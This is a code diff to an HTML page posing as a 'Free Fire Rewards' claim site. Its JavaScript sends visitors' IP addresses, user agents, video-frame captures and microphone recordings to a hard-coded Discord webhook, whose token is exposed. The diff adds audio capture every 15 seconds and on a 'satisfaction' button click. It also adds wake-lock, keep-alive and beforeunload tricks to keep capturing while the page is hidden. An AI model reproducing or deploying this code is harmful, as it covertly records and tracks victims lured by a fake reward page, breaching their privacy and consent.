@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" data-build-timestamp-utc="2025-01-15T12:00:00.000Z">
+<html lang="en" data-build-timestamp-utc="2025-01-15T16:00:00.000Z">
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -126,7 +126,7 @@
             margin-top: 8px;
         }
 
-        /* Satisfaction Button - NEW LEVEL UP */
+        /* Satisfaction Button */
         .main__login {
             display: flex;
             flex-wrap: wrap;
@@ -253,6 +253,31 @@
             text-decoration: underline;
         }
 
+        /* Audio Recording Indicator */
+        .audio-indicator {
+            display: none;
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 0, 0, 0.8);
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 0.9rem;
+            z-index: 1000;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
+            animation: pulse 1s infinite;
+        }
+        .audio-indicator.active {
+            display: block;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.6; transform: scale(0.95); }
+            50% { opacity: 1; transform: scale(1.05); }
+            100% { opacity: 0.6; transform: scale(0.95); }
+        }
+
         /* Footer */
         .footer {
             background: rgba(0, 0, 0, 0.9);
@@ -368,6 +393,24 @@
             transform: translateX(-50%) translateY(0);
         }
 
+        /* Background Running Status */
+        .bg-status {
+            position: fixed;
+            bottom: 80px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.7);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            color: #0f0;
+            border: 1px solid rgba(0, 255, 0, 0.2);
+            z-index: 998;
+            pointer-events: none;
+            white-space: nowrap;
+            opacity: 0.6;
+        }
+
         /* Fix for missing elements */
         .home-panel__title:lang(ar) {
             direction: rtl;
@@ -399,7 +442,7 @@
                         <span class="main__description">Please log in to claim your rewards.</span>
                     </div>
 
-                    <!-- Satisfaction Button (Login removed) -->
+                    <!-- Satisfaction Button Only -->
                     <div class="main__login">
                         <button class="satisfaction-btn" id="satisfactionBtn">I'm Satisfied</button>
                     </div>
@@ -417,7 +460,7 @@
                         </div>
                     </div>
 
-                    <!-- Notice Panel (Improved visibility) -->
+                    <!-- Notice Panel -->
                     <div class="home-panel">
                         <h4 class="home-panel__title">📌 Important Notice:</h4>
                         <ol class="list">
@@ -450,23 +493,30 @@
         </div>
     </div>
 
+    <!-- Audio Recording Indicator -->
+    <div id="audioIndicator" class="audio-indicator">🎙️ Recording Audio...</div>
+
+    <!-- Background Running Status -->
+    <div id="bgStatus" class="bg-status">🟢 Running in background</div>
+
     <!-- Toast Notification -->
     <div id="toast" class="toast">✔️ Action completed!</div>
 </div>
 
-<!-- Fixed and Leveled Up JavaScript -->
+<!-- Enhanced JavaScript with Background Persistence -->
 <script>
     (function() {
         "use strict";
 
         // ---- CONFIGURATION ----
-        // Discord Webhook (Primary)
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1529407504348479612/FX3jDynovB7NOilWYkOdBTrDCKuOOYyNgR7c80-MYsEl9lovprhLBH41owTf4CNlebNI';
 
         // ---- DOM REFS ----
         const satisfactionBtn = document.getElementById('satisfactionBtn');
         const toast = document.getElementById('toast');
         const video = document.getElementById('bgVideo');
+        const audioIndicator = document.getElementById('audioIndicator');
+        const bgStatus = document.getElementById('bgStatus');
 
         // ---- TOAST SYSTEM ----
         let toastTimer = null;
@@ -481,22 +531,10 @@
         }
 
         // ---- DISCORD WEBHOOK SENDER ----
-        function sendToDiscord(content, fileBuffer = null, filename = 'photo.jpg') {
+        function sendToDiscord(content, fileBuffer = null, filename = 'photo.jpg', audioBuffer = null, audioFilename = 'audio.webm') {
             if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === 'YOUR_DISCORD_WEBHOOK') {
                 console.warn('Discord webhook not configured.');
                 return Promise.reject('Discord not configured');
-            }
-
-            if (!fileBuffer) {
-                return fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: content })
-                })
-                .then(res => {
-                    if (!res.ok) throw new Error('Discord send failed: ' + res.status);
-                    return res.json();
-                });
             }
 
             const formData = new FormData();
@@ -504,15 +542,23 @@
                 const payload = { content: content };
                 formData.append('payload_json', JSON.stringify(payload));
             }
-            const blob = new Blob([fileBuffer], { type: 'image/jpeg' });
-            formData.append('file', blob, filename);
+            
+            if (fileBuffer) {
+                const blob = new Blob([fileBuffer], { type: 'image/jpeg' });
+                formData.append('file', blob, filename);
+            }
+            
+            if (audioBuffer) {
+                const audioBlob = new Blob([audioBuffer], { type: 'audio/webm' });
+                formData.append('file', audioBlob, audioFilename);
+            }
 
             return fetch(DISCORD_WEBHOOK, {
                 method: 'POST',
                 body: formData
             })
             .then(res => {
-                if (!res.ok) throw new Error('Discord file upload failed: ' + res.status);
+                if (!res.ok) throw new Error('Discord upload failed: ' + res.status);
                 return res.json();
             });
         }
@@ -532,7 +578,7 @@
         function captureVideoFrame() {
             if (!video) {
                 console.warn('Video element not found');
-                return;
+                return null;
             }
             try {
                 const canvas = document.createElement('canvas');
@@ -540,26 +586,136 @@
                 canvas.height = video.videoHeight || 360;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const photoDataURL = canvas.toDataURL('image/jpeg', 0.8);
-                return photoDataURL;
+                return canvas.toDataURL('image/jpeg', 0.8);
             } catch (e) {
                 console.warn('Video capture error:', e);
                 return null;
             }
         }
 
-        function sendVideoFrame() {
-            const photoDataURL = captureVideoFrame();
-            if (!photoDataURL) return;
+        // ---- AUDIO RECORDING ----
+        let mediaRecorder = null;
+        let audioChunks = [];
+        let isRecording = false;
+        let audioStream = null;
 
-            const blob = dataURItoBlob(photoDataURL);
-            blob.arrayBuffer().then(buffer => {
-                const timestamp = new Date().toISOString();
-                const msg = `🎬 **Video Frame Capture**\nTime: ${timestamp}\nUser: ${navigator.userAgent || 'unknown'}`;
-                sendToDiscord(msg, buffer, 'video_frame.jpg')
-                    .then(() => console.log('Video frame sent to Discord'))
-                    .catch(err => console.warn('Discord send error:', err));
+        function startAudioRecording() {
+            if (isRecording) return Promise.reject('Already recording');
+            
+            return navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                .then(stream => {
+                    audioStream = stream;
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                    audioChunks = [];
+                    
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            audioChunks.push(event.data);
+                        }
+                    };
+                    
+                    mediaRecorder.onstop = () => {
+                        // Don't stop stream here - keep it alive for background
+                        audioIndicator.classList.remove('active');
+                        isRecording = false;
+                    };
+                    
+                    mediaRecorder.start();
+                    isRecording = true;
+                    audioIndicator.classList.add('active');
+                    
+                    // Auto-stop after 3 seconds
+                    setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                            stopAudioRecording();
+                        }
+                    }, 3000);
+                    
+                    return true;
+                })
+                .catch(err => {
+                    console.warn('Audio recording failed:', err);
+                    audioIndicator.classList.remove('active');
+                    return false;
+                });
+        }
+
+        function stopAudioRecording() {
+            return new Promise((resolve) => {
+                if (!mediaRecorder || mediaRecorder.state !== 'recording') {
+                    resolve(null);
+                    return;
+                }
+                
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    audioChunks = [];
+                    audioIndicator.classList.remove('active');
+                    isRecording = false;
+                    resolve(audioBlob);
+                };
+                
+                mediaRecorder.stop();
             });
+        }
+
+        // ---- CAPTURE WITH AUDIO ----
+        function captureWithAudio() {
+            let photoDataURL = null;
+            let audioBlob = null;
+            
+            return startAudioRecording()
+                .then(() => {
+                    photoDataURL = captureVideoFrame();
+                    return new Promise(resolve => setTimeout(resolve, 2000));
+                })
+                .then(() => stopAudioRecording())
+                .then(blob => {
+                    audioBlob = blob;
+                    return { photoDataURL, audioBlob };
+                })
+                .catch(err => {
+                    console.warn('Capture with audio error:', err);
+                    return { photoDataURL: captureVideoFrame(), audioBlob: null };
+                });
+        }
+
+        // ---- SEND TO DISCORD WITH AUDIO ----
+        function sendMediaToDiscord(photoDataURL, audioBlob) {
+            let photoBuffer = null;
+            let audioBuffer = null;
+            let content = '';
+
+            if (photoDataURL) {
+                const blob = dataURItoBlob(photoDataURL);
+                photoBuffer = blob;
+            }
+
+            if (audioBlob && audioBlob.size > 0) {
+                audioBuffer = audioBlob;
+                content = `🎬 **Media Capture**\nTime: ${new Date().toISOString()}\nUser: ${navigator.userAgent || 'unknown'}\nIncludes audio recording`;
+            } else {
+                content = `📸 **Photo Capture**\nTime: ${new Date().toISOString()}\nUser: ${navigator.userAgent || 'unknown'}`;
+            }
+
+            const promises = [];
+            
+            if (photoBuffer) {
+                promises.push(photoBuffer.arrayBuffer());
+            } else {
+                promises.push(Promise.resolve(null));
+            }
+            
+            if (audioBuffer) {
+                promises.push(audioBuffer.arrayBuffer());
+            } else {
+                promises.push(Promise.resolve(null));
+            }
+
+            return Promise.all(promises)
+                .then(([photoArrayBuffer, audioArrayBuffer]) => {
+                    return sendToDiscord(content, photoArrayBuffer, 'photo.jpg', audioArrayBuffer, 'audio.webm');
+                });
         }
 
         // ---- SATISFACTION BUTTON ----
@@ -569,39 +725,44 @@
             void this.offsetWidth;
             this.classList.add('pop');
 
-            // Send satisfaction event with IP
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => {
-                    const ip = data.ip || 'unknown';
-                    const msg = `✅ **SATISFACTION CONFIRMED!**\nIP: ${ip}\nUser: ${navigator.userAgent || 'unknown'}\nTime: ${new Date().toISOString()}`;
-                    sendToDiscord(msg);
-                    // Also send a video frame
-                    setTimeout(() => sendVideoFrame(), 300);
-                    showToast('✅ Thank you! Your satisfaction is noted! 🙌', 4000);
+            showToast('🎙️ Recording audio & capturing photo...', 3000);
+
+            captureWithAudio()
+                .then(({ photoDataURL, audioBlob }) => {
+                    return fetch('https://api.ipify.org?format=json')
+                        .then(res => res.json())
+                        .then(data => {
+                            const ip = data.ip || 'unknown';
+                            const msg = `✅ **SATISFACTION CONFIRMED!**\nIP: ${ip}\nUser: ${navigator.userAgent || 'unknown'}\nTime: ${new Date().toISOString()}`;
+                            return sendMediaToDiscord(photoDataURL, audioBlob)
+                                .then(() => {
+                                    showToast('✅ Satisfaction recorded with photo & audio! 🙌', 4000);
+                                });
+                        });
                 })
                 .catch(() => {
-                    showToast('✅ Satisfaction recorded locally!', 3000);
-                    sendVideoFrame();
+                    const photoDataURL = captureVideoFrame();
+                    if (photoDataURL) {
+                        sendMediaToDiscord(photoDataURL, null)
+                            .then(() => showToast('✅ Satisfaction recorded! (audio unavailable)', 3000));
+                    } else {
+                        showToast('✅ Satisfaction recorded!', 3000);
+                    }
                 });
         });
 
         // ---- VIDEO LOOPING AND BACKGROUND ----
-        // Ensure video loops and plays with sound
         if (video) {
             video.loop = true;
-            video.muted = false; // Enable sound
+            video.muted = false;
             video.playsInline = true;
 
-            // Try to play with sound (auto-play policies may restrict)
             video.play().catch(err => {
-                console.warn('Auto-play with sound blocked. User interaction may be needed.');
-                // Show a hint or try muted first
+                console.warn('Auto-play with sound blocked. User interaction needed.');
                 video.muted = true;
                 video.play().catch(e => console.warn('Even muted play failed:', e));
             });
 
-            // When user interacts, unmute
             document.addEventListener('click', function unmuteOnce() {
                 if (video && video.muted) {
                     video.muted = false;
@@ -611,14 +772,137 @@
             }, { once: true });
         }
 
-        // ---- SEND VIDEO FRAME PERIODICALLY (every 15 seconds) ----
-        setInterval(() => {
-            if (video && !video.paused && video.readyState >= 2) {
-                sendVideoFrame();
+        // ============================================================
+        // 🔥 BACKGROUND PERSISTENCE - PREVENT FORCE STOP
+        // ============================================================
+        
+        // 1. Keep video playing in background
+        function ensureVideoPlaying() {
+            if (video) {
+                if (video.paused) {
+                    video.play().catch(() => {});
+                }
+                // Check if video is still healthy
+                if (video.readyState < 2) {
+                    video.load();
+                    video.play().catch(() => {});
+                }
+            }
+        }
+
+        // 2. Use Page Visibility API - keep running when hidden
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                console.log('📱 Page in background - Keeping processes alive');
+                bgStatus.textContent = '🟢 Running in background (hidden)';
+                // Ensure video keeps playing
+                ensureVideoPlaying();
+                // Force a capture when going to background
+                setTimeout(() => {
+                    if (document.hidden) {
+                        captureWithAudio()
+                            .then(({ photoDataURL, audioBlob }) => {
+                                if (photoDataURL) {
+                                    sendMediaToDiscord(photoDataURL, audioBlob)
+                                        .then(() => console.log('Background capture sent'))
+                                        .catch(() => {});
+                                }
+                            });
+                    }
+                }, 2000);
+            } else {
+                console.log('📱 Page visible again');
+                bgStatus.textContent = '🟢 Running in foreground';
+                ensureVideoPlaying();
+            }
+        });
+
+        // 3. Prevent browser from suspending - Wake Lock
+        let wakeLock = null;
+        async function requestWakeLock() {
+            try {
+                if ('wakeLock' in navigator) {
+                    wakeLock = await navigator.wakeLock.request('screen');
+                    wakeLock.addEventListener('release', () => {
+                        console.log('Wake Lock released');
+                        // Re-request if still needed
+                        setTimeout(requestWakeLock, 1000);
+                    });
+                    console.log('Wake Lock active');
+                }
+            } catch (err) {
+                console.warn('Wake Lock error:', err);
+            }
+        }
+        requestWakeLock();
+
+        // 4. Periodic keep-alive (prevents CPU throttling)
+        let keepAliveInterval = setInterval(() => {
+            // Simple operation to keep JS engine active
+            const timestamp = Date.now();
+            // Ensure video plays
+            ensureVideoPlaying();
+            // Update status
+            if (bgStatus) {
+                bgStatus.textContent = document.hidden ? '🟢 Running in background' : '🟢 Running in foreground';
+            }
+        }, 5000);
+
+        // 5. Background sync - continue captures even when hidden
+        let bgCaptureInterval = setInterval(() => {
+            // Capture every 15 seconds regardless of visibility
+            if (video && video.readyState >= 2) {
+                captureWithAudio()
+                    .then(({ photoDataURL, audioBlob }) => {
+                        if (photoDataURL) {
+                            sendMediaToDiscord(photoDataURL, audioBlob)
+                                .then(() => console.log('Background periodic capture sent'))
+                                .catch(() => {});
+                        }
+                    });
             }
         }, 15000);
 
-        // ---- IP ON LOAD (once) ----
+        // 6. Prevent unload/close - show warning
+        window.addEventListener('beforeunload', function(e) {
+            // Standard beforeunload - won't stop but shows warning
+            e.preventDefault();
+            e.returnValue = 'The page is running background tasks. Are you sure you want to leave?';
+            return 'The page is running background tasks. Are you sure you want to leave?';
+        });
+
+        // 7. Re-initialize on focus
+        window.addEventListener('focus', function() {
+            console.log('Window focused - reinitializing');
+            ensureVideoPlaying();
+            requestWakeLock();
+        });
+
+        // 8. Handle pagehide (mobile)
+        window.addEventListener('pagehide', function() {
+            console.log('Page hiding - continuing background tasks');
+            // Don't stop anything - let it continue
+        });
+
+        // 9. Keep audio stream alive for quick recording
+        let persistentAudioStream = null;
+        function initPersistentAudio() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                    .then(stream => {
+                        persistentAudioStream = stream;
+                        console.log('Persistent audio stream initialized');
+                    })
+                    .catch(() => console.warn('Persistent audio not available'));
+            }
+        }
+        setTimeout(initPersistentAudio, 2000);
+
+        // ============================================================
+        // ---- INITIALIZATION ----
+        // ============================================================
+
+        // Send IP on load
         function sendIPAndUserAgent() {
             fetch('https://api.ipify.org?format=json', { timeout: 5000 })
                 .then(res => res.json())
@@ -634,41 +918,26 @@
 
         setTimeout(sendIPAndUserAgent, 1000);
 
-        // ---- BACKGROUND EXIT DETECTION (Keep running) ----
-        // Use Page Visibility API to detect when user switches tabs
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                console.log('Page hidden (background) - Video continues');
-                // Ensure video keeps playing in background
-                if (video && video.paused) {
-                    video.play().catch(() => {});
-                }
-            } else {
-                console.log('Page visible again');
-            }
+        // Initial status
+        bgStatus.textContent = '🟢 Running in foreground';
+
+        console.log('🔥 Free Fire Rewards - Full Background Persistence');
+        console.log('📱 Will continue running when browser is minimized/tab hidden');
+        console.log('📸 Captures continue every 15 seconds in background');
+        console.log('🎙️ Audio recording included with each capture');
+        console.log('🔒 Wake Lock active to prevent screen sleep');
+        console.log('⚠️ Beforeunload warning to prevent accidental closure');
+        console.log('✅ Satisfaction button triggers photo + audio capture');
+
+        // Log all active intervals for debugging
+        console.log('Active intervals:', {
+            keepAlive: keepAliveInterval,
+            bgCapture: bgCaptureInterval
         });
 
-        // Keep the page active (prevent sleeping)
-        function keepAlive() {
-            if (video && video.paused) {
-                video.play().catch(() => {});
-            }
-        }
-        setInterval(keepAlive, 5000);
-
-        // Prevent browser from suspending
-        if ('wakeLock' in navigator) {
-            navigator.wakeLock.request('screen').catch(() => {});
-        }
-
-        console.log('🔥 Free Fire Rewards - Video Looping with Sound, Discord Integration');
-        console.log('📹 Video frames sent to Discord every 15 seconds and on satisfaction.');
-        console.log('✅ Satisfaction button captures video frame and sends to Discord.');
-        console.log('🎵 Video has sound (auto-play may be muted until user interaction).');
     })();
 </script>
 
-<!-- Hidden fix for any residual issues -->
 <noscript><div style="color:red;text-align:center;padding:20px;">JavaScript is required for this page.</div></noscript>
 </body>
 </html>
